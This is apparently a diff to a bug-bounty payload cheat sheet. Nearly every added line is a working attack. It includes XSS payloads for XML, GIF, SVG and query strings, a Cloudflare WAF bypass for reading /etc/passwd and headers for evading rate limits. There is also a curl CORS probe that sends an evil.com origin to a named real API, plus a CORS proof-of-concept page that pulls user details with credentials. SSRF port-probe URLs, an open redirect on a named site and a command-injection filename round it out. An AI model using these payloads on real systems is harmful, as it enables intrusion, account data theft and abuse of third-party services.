@@ -241,7 +241,6 @@ Command Injection: ; sleep 10;.jpg
 DOS: Rename your file to a long string and upload, It may cause DOS.
 
 
-
 Gif file content:
 GIF89a/<svg/onload=alert(1)>/=alert(document.domain)//;
 
@@ -259,7 +258,100 @@ Svg file content:
 
 
 
+XML upload XSS
 
+<html>
+<head></head>
+<body>
+<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
+</body>
+</html>
+
+
+
+Local File Inclusion WAF (Cloudflare) bypass
+
+../../etc/passwd = 403 Forbidden
+
+../../etc/random/../passwd = 200 OK
+
+
+Rate limit bypass using some custom headers
+
+X-Forwarded-For: IP
+X-Forwarded-IP: IP
+X-Client-IP: IP
+X-Remote-IP: IP
+X-Originating-IP: IP
+X-Host: IP
+X-Client: IP
+
+
+Reflected xss :)
+Payload : %27%2B%3C%2FScripT%3E%3CScRIpT%3Eprompt%28document.domain%29%3C%2FscRIpT%3E%2B%27
+
+-------------------------
+
+Now we need to make sure that ORIGIN and REFERER headers will not cause any problem:
+
+Origin: http://attack.com ==> 200 Ok //Greate
+Referer: http://attack.com/ ==> 403 Forbidden. //Bad News
+Referer: http://attack$target$.com/ ==> 200 Ok. //Report it ryt now (“:
+
+-------------------------
+
+CORS 
+curl https://api.artsy.net -H “Origin: https://evil.com” -I
+
+
+Access-Control-Allow-Credentials: true
+and
+Access-Control-Allow-Origin: https://evil.com
+
+
+Exploit Code:
+
+<!DOCTYPE html>
+<html>
+<body>
+<center>
+<h2>CORS POC Exploit</h2>
+
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+
+<script>
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+document.getElementById(“demo”).innerHTML =
+alert(this.responseText);
+}
+};
+xhttp.open(“GET”, “https://domain.com/api/user_details/<User-ID>”, true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+</script>
+
+<body>
+</html>
+
+------------------
+SSRF 
+https://subdomain.site.com/fetch?token=1&url=http://scanme.nmap.org::22
+https://subdomain.site.com/fetch?token=1&url=http://scanme.nmap.org::111
+------------------
+openredirect 
+https://en.datocapital.com/isn/Login?u=https%3A%2F%2Fwww.google.com.pk%2F
+------------------
+
+xss
+"><img src=x onerror=prompt(1);>
+“><img src=x onerror=prompt(2);>
+------------------
 
 
 
